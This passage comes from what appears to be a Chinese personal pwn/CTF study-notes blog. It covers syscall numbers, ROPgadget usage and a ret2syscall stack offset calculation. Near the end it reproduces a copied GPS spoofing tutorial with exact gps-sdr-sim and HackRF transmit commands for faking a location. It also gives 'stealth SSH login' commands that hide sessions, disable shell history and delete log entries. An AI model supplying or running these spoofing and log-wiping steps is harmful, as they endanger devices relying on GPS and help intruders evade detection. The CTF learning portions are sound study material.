__NR_setresgid 119</span></span><br><span class="line">        <span class="comment">#define __NR_getresgid 120</span></span><br><span class="line">        <span class="comment">#define __NR_getpgid 121</span></span><br><span class="line">        <span class="comment">#define __NR_setfsuid 122</span></span><br><span class="line">        <span class="comment">#define __NR_setfsgid 123</span></span><br><span class="line">        <span class="comment">#define __NR_getsid 124</span></span><br><span class="line">        <span class="comment">#define __NR_capget 125</span></span><br><span class="line">        <span class="comment">#define __NR_capset 126</span></span><br><span class="line">        <span class="comment">#define __NR_rt_sigpending 127</span></span><br><span class="line">        <span class="comment">#define __NR_rt_sigtimedwait 128</span></span><br><span class="line">        <span class="comment">#define __NR_rt_sigqueueinfo 129</span></span><br><span class="line">        <span class="comment">#define __NR_rt_sigsuspend 130</span></span><br><span class="line">        <span class="comment">#define __NR_sigaltstack 131</span></span><br><span class="line">        <span class="comment">#define __NR_utime 132</span></span><br><span class="line">        <span class="comment">#define __NR_mknod 133</span></span><br><span class="line">        <span class="comment">#define __NR_uselib 134</span></span><br><span class="line">        <span class="comment">#define __NR_personality 135</span></span><br><span class="line">        <span class="comment">#define __NR_ustat 136</span></span><br><span class="line">        <span class="comment">#define __NR_statfs 137</span></span><br><span class="line">        <span class="comment">#define __NR_fstatfs 138</span></span><br><span class="line">        <span class="comment">#define __NR_sysfs 139</span></span><br><span class="line">        <span class="comment">#define __NR_getpriority 140</span></span><br><span class="line">        <span class="comment">#define __NR_setpriority 141</span></span><br><span class="line">        <span class="comment">#define __NR_sched_setparam 142</span></span><br><span class="line">        <span class="comment">#define __NR_sched_getparam 143</span></span><br><span class="line">        <span class="comment">#define __NR_sched_setscheduler 144</span></span><br><span class="line">        <span class="comment">#define __NR_sched_getscheduler 145</span></span><br><span class="line">        <span class="comment">#define __NR_sched_get_priority_max 146</span></span><br><span class="line">        <span class="comment">#define __NR_sched_get_priority_min 147</span></span><br><span class="line">        <span class="comment">#define __NR_sched_rr_get_interval 148</span></span><br><span class="line">        <span class="comment">#define __NR_mlock 149</span></span><br><span class="line">        <span class="comment">#define __NR_munlock 150</span></span><br><span class="line">        <span class="comment">#define __NR_mlockall 151</span></span><br><span class="line">        <span class="comment">#define __NR_munlockall 152</span></span><br><span class="line">        <span class="comment">#define __NR_vhangup 153</span></span><br><span class="line">        <span class="comment">#define __NR_modify_ldt 154</span></span><br><span class="line">        <span class="comment">#define __NR_pivot_root 155</span></span><br><span class="line">        <span class="comment">#define __NR__sysctl 156</span></span><br><span class="line">        <span class="comment">#define __NR_prctl 157</span></span><br><span class="line">        <span class="comment">#define __NR_arch_prctl 158</span></span><br><span class="line">        <span class="comment">#define __NR_adjtimex 159</span></span><br><span class="line">        <span class="comment">#define __NR_setrlimit 160</span></span><br><span class="line">        <span class="comment">#define __NR_chroot 161</span></span><br><span class="line">        <span class="comment">#define __NR_sync 162</span></span><br><span class="line">        <span class="comment">#define __NR_acct 163</span></span><br><span class="line">        <span class="comment">#define __NR_settimeofday 164</span></span><br><span class="line">        <span class="comment">#define __NR_mount 165</span></span><br><span class="line">        <span class="comment">#define __NR_umount2 166</span></span><br><span class="line">        <span class="comment">#define __NR_swapon 167</span></span><br><span class="line">        <span class="comment">#define __NR_swapoff 168</span></span><br><span class="line">        <span class="comment">#define __NR_reboot 169</span></span><br><span class="line">        <span class="comment">#define __NR_sethostname 170</span></span><br><span class="line">        <span class="comment">#define __NR_setdomainname 171</span></span><br><span class="line">        <span class="comment">#define __NR_iopl 172</span></span><br><span class="line">        <span class="comment">#define __NR_ioperm 173</span></span><br><span class="line">        <span class="comment">#define __NR_create_module 174</span></span><br><span class="line">        <span class="comment">#define __NR_init_module 175</span></span><br><span class="line">        <span class="comment">#define __NR_delete_module 176</span></span><br><span class="line">        <span class="comment">#define __NR_get_kernel_syms 177</span></span><br><span class="line">        <span class="comment">#define __NR_query_module 178</span></span><br><span class="line">        <span class="comment">#define __NR_quotactl 179</span></span><br><span class="line">        <span class="comment">#define __NR_nfsservctl 180</span></span><br><span class="line">        <span class="comment">#define __NR_getpmsg 181</span></span><br><span class="line">        <span class="comment">#define __NR_putpmsg 182</span></span><br><span class="line">        <span class="comment">#define __NR_afs_syscall 183</span></span><br><span class="line">        <span class="comment">#define __NR_tuxcall 184</span></span><br><span class="line">        <span class="comment">#define __NR_security 185</span></span><br><span class="line">        <span class="comment">#define __NR_gettid 186</span></span><br><span class="line">        <span class="comment">#define __NR_readahead 187</span></span><br><span class="line">        <span class="comment">#define __NR_setxattr 188</span></span><br><span class="line">        <span class="comment">#define __NR_lsetxattr 189</span></span><br><span class="line">        <span class="comment">#define __NR_fsetxattr 190</span></span><br><span class="line">        <span class="comment">#define __NR_getxattr 191</span></span><br><span class="line">        <span class="comment">#define __NR_lgetxattr 192</span></span><br><span class="line">        <span class="comment">#define __NR_fgetxattr 193</span></span><br><span class="line">        <span class="comment">#define __NR_listxattr 194</span></span><br><span class="line">        <span class="comment">#define __NR_llistxattr 195</span></span><br><span class="line">        <span class="comment">#define __NR_flistxattr 196</span></span><br><span class="line">        <span class="comment">#define __NR_removexattr 197</span></span><br><span class="line">        <span class="comment">#define __NR_lremovexattr 198</span></span><br><span class="line">        <span class="comment">#define __NR_fremovexattr 199</span></span><br><span class="line">        <span class="comment">#define __NR_tkill 200</span></span><br><span class="line">        <span class="comment">#define __NR_time 201</span></span><br><span class="line">        <span class="comment">#define __NR_futex 202</span></span><br><span class="line">        <span class="comment">#define __NR_sched_setaffinity 203</span></span><br><span class="line">        <span class="comment">#define __NR_sched_getaffinity 204</span></span><br><span class="line">        <span class="comment">#define __NR_set_thread_area 205</span></span><br><span class="line">        <span class="comment">#define __NR_io_setup 206</span></span><br><span class="line">        <span class="comment">#define __NR_io_destroy 207</span></span><br><span class="line">        <span class="comment">#define __NR_io_getevents 208</span></span><br><span class="line">        <span class="comment">#define __NR_io_submit 209</span></span><br><span class="line">        <span class="comment">#define __NR_io_cancel 210</span></span><br><span class="line">        <span class="comment">#define __NR_get_thread_area 211</span></span><br><span class="line">        <span class="comment">#define __NR_lookup_dcookie 212</span></span><br><span class="line">        <span class="comment">#define __NR_epoll_create 213</span></span><br><span class="line">        <span class="comment">#define __NR_epoll_ctl_old 214</span></span><br><span class="line">        <span class="comment">#define __NR_epoll_wait_old 215</span></span><br><span class="line">        <span class="comment">#define __NR_remap_file_pages 216</span></span><br><span class="line">        <span class="comment">#define __NR_getdents64 217</span></span><br><span class="line">        <span class="comment">#define __NR_set_tid_address 218</span></span><br><span class="line">        <span class="comment">#define __NR_restart_syscall 219</span></span><br><span class="line">        <span class="comment">#define __NR_semtimedop 220</span></span><br><span class="line">        <span class="comment">#define __NR_fadvise64 221</span></span><br><span class="line">        <span class="comment">#define __NR_timer_create 222</span></span><br><span class="line">        <span class="comment">#define __NR_timer_settime 223</span></span><br><span class="line">        <span class="comment">#define __NR_timer_gettime 224</span></span><br><span class="line">        <span class="comment">#define __NR_timer_getoverrun 225</span></span><br><span class="line">        <span class="comment">#define __NR_timer_delete 226</span></span><br><span class="line">        <span class="comment">#define __NR_clock_settime 227</span></span><br><span class="line">        <span class="comment">#define __NR_clock_gettime 228</span></span><br><span class="line">        <span class="comment">#define __NR_clock_getres 229</span></span><br><span class="line">        <span class="comment">#define __NR_clock_nanosleep 230</span></span><br><span class="line">        <span class="comment">#define __NR_exit_group 231</span></span><br><span class="line">        <span class="comment">#define __NR_epoll_wait 232</span></span><br><span class="line">        <span class="comment">#define __NR_epoll_ctl 233</span></span><br><span class="line">        <span class="comment">#define __NR_tgkill 234</span></span><br><span class="line">        <span class="comment">#define __NR_utimes 235</span></span><br><span class="line">        <span class="comment">#define __NR_vserver 236</span></span><br><span class="line">        <span class="comment">#define __NR_mbind 237</span></span><br><span class="line">        <span class="comment">#define __NR_set_mempolicy 238</span></span><br><span class="line">        <span class="comment">#define __NR_get_mempolicy 239</span></span><br><span class="line">        <span class="comment">#define __NR_mq_open 240</span></span><br><span class="line">        <span class="comment">#define __NR_mq_unlink 241</span></span><br><span class="line">        <span class="comment">#define __NR_mq_timedsend 242</span></span><br><span class="line">        <span class="comment">#define __NR_mq_timedreceive 243</span></span><br><span class="line">        <span class="comment">#define __NR_mq_notify 244</span></span><br><span class="line">        <span class="comment">#define __NR_mq_getsetattr 245</span></span><br><span class="line">        <span class="comment">#define __NR_kexec_load 246</span></span><br><span class="line">        <span class="comment">#define __NR_waitid 247</span></span><br><span class="line">        <span class="comment">#define __NR_add_key 248</span></span><br><span class="line">        <span class="comment">#define __NR_request_key 249</span></span><br><span class="line">        <span class="comment">#define __NR_keyctl 250</span></span><br><span class="line">        <span class="comment">#define __NR_ioprio_set 251</span></span><br><span class="line">        <span class="comment">#define __NR_ioprio_get 252</span></span><br><span class="line">        <span class="comment">#define __NR_inotify_init 253</span></span><br><span class="line">        <span class="comment">#define __NR_inotify_add_watch 254</span></span><br><span class="line">        <span class="comment">#define __NR_inotify_rm_watch 255</span></span><br><span class="line">        <span class="comment">#define __NR_migrate_pages 256</span></span><br><span class="line">        <span class="comment">#define __NR_openat 257</span></span><br><span class="line">        <span class="comment">#define __NR_mkdirat 258</span></span><br><span class="line">        <span class="comment">#define __NR_mknodat 259</span></span><br><span class="line">        <span class="comment">#define __NR_fchownat 260</span></span><br><span class="line">        <span class="comment">#define __NR_futimesat 261</span></span><br><span class="line">        <span class="comment">#define __NR_newfstatat 262</span></span><br><span class="line">        <span class="comment">#define __NR_unlinkat 263</span></span><br><span class="line">        <span class="comment">#define __NR_renameat 264</span></span><br><span class="line">        <span class="comment">#define __NR_linkat 265</span></span><br><span class="line">        <span class="comment">#define __NR_symlinkat 266</span></span><br><span class="line">        <span class="comment">#define __NR_readlinkat 267</span></span><br><span class="line">        <span class="comment">#define __NR_fchmodat 268</span></span><br><span class="line">        <span class="comment">#define __NR_faccessat 269</span></span><br><span class="line">        <span class="comment">#define __NR_pselect6 270</span></span><br><span class="line">        <span class="comment">#define __NR_ppoll 271</span></span><br><span class="line">        <span class="comment">#define __NR_unshare 272</span></span><br><span class="line">        <span class="comment">#define __NR_set_robust_list 273</span></span><br><span class="line">        <span class="comment">#define __NR_get_robust_list 274</span></span><br><span class="line">        <span class="comment">#define __NR_splice 275</span></span><br><span class="line">        <span class="comment">#define __NR_tee 276</span></span><br><span class="line">        <span class="comment">#define __NR_sync_file_range 277</span></span><br><span class="line">        <span class="comment">#define __NR_vmsplice 278</span></span><br><span class="line">        <span class="comment">#define __NR_move_pages 279</span></span><br><span class="line">        <span class="comment">#define __NR_utimensat 280</span></span><br><span class="line">        <span class="comment">#define __NR_epoll_pwait 281</span></span><br><span class="line">        <span class="comment">#define __NR_signalfd 282</span></span><br><span class="line">        <span class="comment">#define __NR_timerfd_create 283</span></span><br><span class="line">        <span class="comment">#define __NR_eventfd 284</span></span><br><span class="line">        <span class="comment">#define __NR_fallocate 285</span></span><br><span class="line">        <span class="comment">#define __NR_timerfd_settime 286</span></span><br><span class="line">        <span class="comment">#define __NR_timerfd_gettime 287</span></span><br><span class="line">        <span class="comment">#define __NR_accept4 288</span></span><br><span class="line">        <span class="comment">#define __NR_signalfd4 289</span></span><br><span class="line">        <span class="comment">#define __NR_eventfd2 290</span></span><br><span class="line">        <span class="comment">#define __NR_epoll_create1 291</span></span><br><span class="line">        <span class="comment">#define __NR_dup3 292</span></span><br><span class="line">        <span class="comment">#define __NR_pipe2 293</span></span><br><span class="line">        <span class="comment">#define __NR_inotify_init1 294</span></span><br><span class="line">        <span class="comment">#define __NR_preadv 295</span></span><br><span class="line">        <span class="comment">#define __NR_pwritev 296</span></span><br><span class="line">        <span class="comment">#define __NR_rt_tgsigqueueinfo 297</span></span><br><span class="line">        <span class="comment">#define __NR_perf_event_open 298</span></span><br><span class="line">        <span class="comment">#define __NR_recvmmsg 299</span></span><br><span class="line">        <span class="comment">#define __NR_fanotify_init 300</span></span><br><span class="line">        <span class="comment">#define __NR_fanotify_mark 301</span></span><br><span class="line">        <span class="comment">#define __NR_prlimit64 302</span></span><br><span class="line">        <span class="comment">#define __NR_name_to_handle_at 303</span></span><br><span class="line">        <span class="comment">#define __NR_open_by_handle_at 304</span></span><br><span class="line">        <span class="comment">#define __NR_clock_adjtime 305</span></span><br><span class="line">        <span class="comment">#define __NR_syncfs 306</span></span><br><span class="line">        <span class="comment">#define __NR_sendmmsg 307</span></span><br><span class="line">        <span class="comment">#define __NR_setns 308</span></span><br><span class="line">        <span class="comment">#define __NR_getcpu 309</span></span><br><span class="line">        <span class="comment">#define __NR_process_vm_readv 310</span></span><br><span class="line">        <span class="comment">#define __NR_process_vm_writev 311</span></span><br><span class="line">        <span class="comment">#define __NR_kcmp 312</span></span><br><span class="line">        <span class="comment">#define __NR_finit_module 313</span></span><br><span class="line">        <span class="comment">#define __NR_sched_setattr 314</span></span><br><span class="line">        <span class="comment">#define __NR_sched_getattr 315</span></span><br><span class="line">        <span class="comment">#define __NR_renameat2 316</span></span><br><span class="line">        <span class="comment">#define __NR_seccomp 317</span></span><br><span class="line">        <span class="comment">#define __NR_getrandom 318</span></span><br><span class="line">        <span class="comment">#define __NR_memfd_create 319</span></span><br><span class="line">        <span class="comment">#define __NR_kexec_file_load 320</span></span><br><span class="line">        <span class="comment">#define __NR_bpf 321</span></span><br><span class="line">        <span class="comment">#define __NR_execveat 322</span></span><br><span class="line">        <span class="comment">#define __NR_userfaultfd 323</span></span><br><span class="line">        <span class="comment">#define __NR_membarrier 324</span></span><br><span class="line">        <span class="comment">#define __NR_mlock2 325</span></span><br><span class="line">        <span class="comment">#define __NR_copy_file_range 326</span></span><br><span class="line">        <span class="comment">#define __NR_preadv2 327</span></span><br><span class="line">        <span class="comment">#define __NR_pwritev2 328</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#endif /* _ASM_X86_UNISTD_64_H */</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><br/><br/><h1 id="ROPgadget工具"><a href="#ROPgadget工具" class="headerlink" title="ROPgadget工具"></a>ROPgadget工具</h1><p><strong>安装&amp;使用：</strong></p><p>参考链接：<a href="https://blog.csdn.net/yongbaoii/article/details/109098446">(2条消息) ROPgadget 安装 错误处理 与使用_yongbaoii的博客-CSDN博客_ropgadget</a></p><p>参考链接：<a href="https://blog.csdn.net/weixin_45556441/article/details/114631043">(2条消息) (Pwn)CTF工具 ROPgadget 的安装与使用介绍_半岛铁盒@的博客-CSDN博客_ropgadget命令</a></p><p>参考链接：<a href="https://www.jianshu.com/p/1d7f0c56a323">ROPgadgets - 简书 (jianshu.com)</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">安装：</span><br><span class="line">sudo apt-get install python-capstone</span><br><span class="line"> </span><br><span class="line">git <span class="built_in">clone</span> https://github.com/JonathanSalwan/ROPgadget.git</span><br><span class="line"> </span><br><span class="line"><span class="built_in">cd</span> ROPgadget</span><br><span class="line"> </span><br><span class="line">sudo python setup.py install</span><br><span class="line"></span><br><span class="line">使用：</span><br><span class="line">ROPgadget --binary rop  --only <span class="string">&#x27;pop|ret&#x27;</span> | grep <span class="string">&#x27;eax&#x27;</span></span><br><span class="line">查找可存储寄存器的代码</span><br><span class="line"></span><br><span class="line">ROPgadget --binary rop --string <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">查找字符串</span><br><span class="line"></span><br><span class="line">ROPgadget --binary rop  --only <span class="string">&#x27;int&#x27;</span></span><br><span class="line">查找有int 0x80的地址</span><br><span class="line"></span><br><span class="line">......</span><br></pre></td></tr></table></figure><br/><br/><h1 id="偏移计算"><a href="#偏移计算" class="headerlink" title="偏移计算"></a>偏移计算</h1><p><strong>例1：</strong></p><p>题目链接：<a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#ret2syscall">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#ret2syscall</a></p><p>其中有这么一段：</p><p><img src="image-20220315222546638.png" alt="image-20220315222546638"></p><p>前置ida反编译找到main函数处，tab键切至该界面，找到call指令对应的地址并在gdb中下断点：</p><p><img src="image-20220315223144227.png" alt="image-20220315223144227"></p><p><img src="image-20220315223426214.png" alt="image-20220315223426214"></p><p>ni单走，调试至该位置，查看到三句汇编指令（s地址装入eax，eax赋给esp，调用gets函数）</p><p><img src="image-20220315222941502.png" alt="image-20220315222941502"></p><p>再看到ebp指向0xffffd178，esp指向0xffffd0f0（但这并不是s的起始地址），0xffffd0f0处存储的0xffffd10c才是s在栈上的起始地址（要解释清楚的话，得画个栈的图，还得有汇编基础，汇编我目前就学了些皮毛，解释不了，只知道以后遇到这种类似的这样算偏移准没错）</p><p>。计算规则：ebp（0xffffd178）+  4（ebp上面的ret，覆盖ebp要4个字节）-  s起始地址（0xffffd10c）= 0x70 = 112（10进制，0x是16进制前缀）</p><p>建议对比ret2txt看（<a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#ret2text%EF%BC%89">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#ret2text）</a></p><p>亟待补充的知识（写给个人看的）：汇编</p><p>需要复习的知识：栈</p><br/><br/><br/><br/><br/><p>注：个人笔记，重在个人看懂</p><br/><br/><p>链接：<a href="https://sh4oba1.xyz/pages/4ba610/#%E6%A0%88%E6%BA%A2%E5%87%BA-rop">pwn基础 | Sh4oBa1’s blog</a></p><br/><p>链接(看ta的友链)：<a href="https://sh4oba1.xyz/">Sh4oBa1’s blog</a></p><p>链接(看ta的友链)：<a href="https://f4de-bak.github.io/">F4DE (f4de-bak.github.io)</a></p><p>链接：<a href="https://x1hy9.github.io/">Kimengun的学习之路 (x1hy9.github.io)</a></p><p>链接：<a href="https://0xtunan.github.io/2020/06/04/%E7%94%A8github-hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/">用github-hexo搭建博客 | TuNan’s Blogs (0xtunan.github.io)</a></p><br/><p>链接(无意中发现的有关软件破解的博客)：<a href="https://blog.csdn.net/song_10/article/details/83720673">(2条消息) EAX寄存器（关键跳，关键CALL）_song_10的博客-CSDN博客_eax寄存器</a></p><p>链接：<a href="https://blog.csdn.net/song_10">(2条消息) song_10的博客_song-10_CSDN博客-C++,python学习笔记,攻防世界领域博主</a></p><br/><br/><br/><br/><br/><br/><br/><p><br/><br/></p><br/><br/><br/><br/><br/><br/><br/><br/><p><br/><br/></p><br/><br/><br/><br/><br/><br/><br/><br/><p><br/><br/></p><br/><br/><br/><br/><br/><br/><br/><br/><p><br/><br/></p><br/><br/><br/><br/><br/><br/><br/><br/><p><br/><br/></p><br/><br/><br/><br/><br/><br/><br/><br/><p><br/><br/></p><br/><br/><br/><br/><br/><br/><br/><br/><p><br/><br/></p><br/><br/><br/><br/><br/><br/><br/><br/><p><br/><br/></p><br/><br/><br/><br/><br/><br/><br/><br/><p><br/><br/></p><br/><br/><br/><br/><br/><br/><br/><br/><p><br/><br/></p><br/><br/><br/><br/><br/><br/><br/><br/><p><br/><br/></p><br/><br/><br/><br/><br/><br/><br/><br/><p><br/><br/></p><br/><br/><br/><br/><br/><br/><br/><br/><p><br/><br/></p><br/><br/><br/><br/><br/><br/><br/><br/><p><br/><br/></p><br/><br/><br/><br/><br/><br/><br/><br/><p><br/><br/></p><br/><br/><br/><br/><br/><br/><br/><br/><p><br/><br/></p><br/><br/><br/><br/><br/><br/><br/><br/><p><br/><br/></p><br/><br/><br/><br/><br/><br/><br/><br/><p><br/><br/></p><br/><br/><br/><br/><br/><br/><br/><br/><p><br/><br/></p><br/><br/><br/><br/><br/><br/><br/><br/><p><br/><br/></p><br/><br/><br/><br/><br/><br/><br/><br/><p><br/><br/></p><br/><br/><br/><br/><br/><br/><br/><br/><p><br/><br/></p><br/><br/><br/><br/><br/><br/><br/><br/><p><br/><br/></p><br/><br/><br/><br/><br/><br/><br/><br/><p><br/><br/></p><br/><br/><br/><br/><br/><br/><br/><br/><p><br/><br/></p><br/><br/><br/><br/><br/><br/><br/><br/><p><br/><br/></p><br/><br/><br/><br/><br/><br/><br/><br/><p><br/><br/></p><br/><br/><br/><br/><br/><br/><br/><br/><p><br/><br/></p><br/><br/><br/><br/><br/><br/><br/><br/><p><br/><br/></p><br/><br/><br/><br/><br/><br/><br/><br/><p><br/><br/></p><br/><br/><br/><br/><br/><br/><br/><br/><p><br/><br/></p><br/><br/><br/><br/><br/><br/><br/><br/><p><br/><br/></p><br/><br/><br/><br/><br/><br/><br/><br/><p><br/><br/></p><br/><br/><br/><br/><br/><br/><br/><br/><p><br/><br/></p><br/><br/><br/><br/><br/><br/><br/><br/><p><br/><br/></p><br/><br/><br/><br/><br/><br/><br/><br/><p><br/><br/></p><br/><br/><br/><br/><br/><br/><br/><br/><p><br/><br/></p><br/><br/><br/><br/><br/><br/><br/><br/><p><br/><br/></p><br/><br/><br/><br/><br/><br/><br/><br/><p><br/><br/></p><br/><br/><br/><br/><br/><br/><br/><br/><p><br/><br/></p><br/><br/><br/><br/><br/><br/><br/><br/><p><br/><br/></p><br/><br/><br/><br/><br/><br/><br/><br/><p><br/><br/></p><br/><br/><br/><br/><br/><br/><br/><br/><p><br/><br/></p><br/><br/><br/><br/><br/><br/><br/><br/><p><br/><br/></p><br/><br/><br/><br/><br/><br/><br/><br/><p><br/><br/></p><br/><br/><br/><br/><br/><br/><br/><br/><p><br/><br/></p><br/><br/><br/><br/><br/><br/><br/><br/><p><br/><br/></p><br/><br/><br/><br/><br/><br/><br/><br/><p><br/><br/></p><br/><br/><br/><br/><br/><br/><br/><br/><p><br/><br/></p><br/><br/><br/><br/><br/><br/><br/><br/><p><br/><br/></p><br/><br/><br/><br/><br/><br/><br/><br/><p><br/><br/></p><br/><br/><br/><br/><br/><br/><br/><br/><p><br/><br/></p><br/><br/><br/><br/><br/><br/><br/><br/><p><br/><br/></p><br/><br/><br/><br/><br/><br/><br/><br/><p><br/><br/></p><br/><br/><br/><br/><br/><br/><br/><br/><p><br/><br/></p><br/><br/><br/><br/><br/><br/><br/><br/><p><br/><br/></p><br/><br/><br/><br/><br/><br/><br/><br/><p><br/><br/></p><br/><br/><br/><br/><br/><br/><br/><br/><p><br/><br/></p><br/><br/><br/><br/><br/><br/><br/><br/><p><br/><br/></p><br/><br/><br/><br/><br/><br/><br/><br/><p><br/><br/></p><br/><br/><br/><br/><br/><br/><br/><br/><p><br/><br/></p><br/><br/><br/><br/><br/><br/><br/><br/><p><br/><br/></p><br/><br/><br/><br/><br/><br/><br/><br/><p><br/><br/></p><br/><br/><br/><br/><br/><br/><br/><p>GPS劫持：</p><p>暂时没空搞这个，为了防止原文被删除，本人在此copy一份</p><p>链接：<a href="https://toutiao.io/posts/uax8a1p/preview">https://toutiao.io/posts/uax8a1p/preview</a></p><p><strong>0x00 原理介绍</strong></p><p>GPS劫持有一定的破坏强度，攻击者利用路由、伪基站等技术来伪造GPS信号用于产生虚假的定位，这个技术不仅仅针对于手机，对其他设备都有一定的威胁，安全问题令人深思</p><p>HackRF是一个完全开源的项目，不管从软件还是硬件，已经国产化。设备可以在淘宝买，前提是我们需要借助 HackRF One</p><p><img src="640.jpeg" alt="img"></p><p><strong>0x01 GPS动态轨迹伪造</strong></p><p>我们可以通过伪造一个定位来进行重放，可以借助Google Earth（官网可下）</p><p>首先点击添加路径</p><p><img src="640-16492519624892.jpeg" alt="img"></p><p>选定一段道路并自定义名称，在此我们选择在巴厘岛库塔海滩走一趟</p><p><img src="640-16492519649644.jpeg" alt="img"></p><p>将路径另存为到本地</p><p><img src="640-16492519668146.jpeg" alt="img"></p><p>在此注意定存为格式选择.kml</p><p><img src="640-16492519707248.jpeg" alt="img"></p><p>然后我们需要把.kml文件转换成NMEA格式</p><p>在此借助的工具在后台回复“GPS劫持”即可获得</p><p>点击“Load KML file”打开文件</p><p><img src="640-164925197371610.jpeg" alt="img"></p><p>导出为NMEA文件</p><p><img src="640-164925197641012.jpeg" alt="img"></p><p>下载GPS数据</p><p>下载地址:</p><p><a href="ftp://cddis.gsfc.nasa.gov/pub/gps/data/daily/2019/brdc/">ftp://cddis.gsfc.nasa.gov/pub/gps/data/daily/2019/brdc/</a></p><p>此地址为美国国家宇航局的GPS数据回传的ftp文件服务器</p><p>将.txt文件拖到Ubuntu虚拟机中</p><p><img src="640-164925197919214.jpeg" alt="img"></p><p>选择最新文件下载 n.Z 文件</p><p><img src="640-164925198134116.jpeg" alt="img"></p><p>下载GPS-SDR-SIM</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/osqzss/gps-sdr-sim.git</span><br></pre></td></tr></table></figure><p>若没有gcc可安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install gcc</span><br></pre></td></tr></table></figure><p>进行编译</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd gps-sdr-simgcc gpssim.c -lm -O3 -o gps-sdr-sim</span><br></pre></td></tr></table></figure><p><img src="640-164925198384318.jpeg" alt="img"></p><p>gps-sdr-sim模块参数</p><p><img src="640-164925198558120.jpeg" alt="img"></p><p>运行， 生成 gpssim.bin 文件</p><p>./gps-sdr-sim -e &lt;导航电文文件&gt; -u &lt;轨迹文件&gt; -b 8</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./gps-sdr-sim -e brdc3650.19n -g position.txt -b 8</span><br></pre></td></tr></table></figure><p><img src="640-164925198730622.jpeg" alt="img"></p><p>最后使用 HackRF One 重放数据</p><p>hackrf_transfer -t&lt;目标数据文件&gt;-f&lt;发射频率&gt;-s&lt;采样频率&gt;-a&lt;是否开启增益&gt;-x&lt;增益值&gt;-R</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hackrf_transfer -t gpssim.bin -f 1575420000 -s 2600000 -a 1 -x 47 –R</span><br></pre></td></tr></table></figure><p><em><strong>*0x02 GPS静态定位伪造*</strong></em></p><p>同样下载最新 n.Z 文件</p><p>下载地址:</p><p><a href="ftp://cddis.gsfc.nasa.gov/pub/gps/data/daily/2019/brdc/">ftp://cddis.gsfc.nasa.gov/pub/gps/data/daily/2019/brdc/</a></p><p><img src="640-164925198974124.jpeg" alt="img"></p><p>设置经纬度并生成数据样本</p><p><strong>这里的经纬度我们选择巴厘岛的经纬度</strong></p><p><strong>经度：</strong><strong>-8.616147</strong></p><p><strong>纬度：****115.674842</strong></p><p>**<br>**</p><p>./gps-sdr-sim -e &lt;GPS导航电文文件&gt; -l &lt;经度，纬度，海拔&gt; -b &lt;采样精度&gt;</p><ul><li></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./gps-sdr-sim -e brdc3650.19n -l -8.616147,115.674842,100 -b 8</span><br></pre></td></tr></table></figure><p><img src="640-164925199247626.jpeg" alt="img"></p><p>插上Hackrf，发射GPS数据开始伪造GPS信号</p><p>hackrf_transfer -t&lt;目标数据文件&gt;-f&lt;发射频率&gt;-s&lt;采样频率&gt;-a&lt;是否开启增益&gt;-x&lt;增益值&gt;-R</p><ul><li></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hackrf_transfer -t gpssim.bin -f 1575420000 -s 2600000 -a 1 -x 0 -R</span><br></pre></td></tr></table></figure><p>HackRF One 发送完GPS信号100秒后会自动停止，若想循环发送信号，加参数-R，过程需要几十秒的等待时间</p><p>这时候我们发现自己的定位已经在巴厘岛，说明<strong>欺骗成功</strong></p><p><img src="640-164925199651728.jpeg" alt="img"></p><p>本文仅用于学习研究，切勿用于违法途径！</p><br/><br/><p><strong>SSH隐身登录：</strong></p><p>原文链接：<a href="https://blog.csdn.net/qq_41661056/article/details/103820951">https://blog.csdn.net/qq_41661056/article/details/103820951</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#远程登录w查看不到</span><br><span class="line">ssh -T root@127.0.0.1 /bin/bash -i</span><br><span class="line"></span><br><span class="line">#不记录ssh公钥在本地.ssh目录中</span><br><span class="line">ssh -o UserKnownHostsFile=/dev/null -T user@host /bin/bash –i</span><br><span class="line"></span><br><span class="line">#不留下.bash_history</span><br><span class="line">unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null; export HISTSIZE=0; export HISTFILESIZE=0</span><br><span class="line"></span><br><span class="line">#删除部分日志,比如以当天日期或者自己的登录ip</span><br><span class="line">sed  -i &#x27;/当前时间/&#x27;d  /var/log/messages</span><br></pre></td></tr></table></figure><br/><br/><p><strong>WINDOWS 日志：</strong></p><p>链接：<a 